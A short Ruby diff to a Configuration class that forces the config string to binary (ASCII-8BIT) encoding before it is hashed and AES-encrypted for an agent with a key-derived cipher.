@@ -22,7 +22,7 @@ class Configuration
 
   def encrypted_config(confkey)
     # encrypt the config for the agent using the confkey
-    aes_encrypt(self.config + Digest::SHA1.digest(self.config), Digest::MD5.digest(confkey))
+    aes_encrypt(self.config.force_encoding('ASCII-8BIT') + Digest::SHA1.digest(self.config), Digest::MD5.digest(confkey))
   end
 
   def sync_host
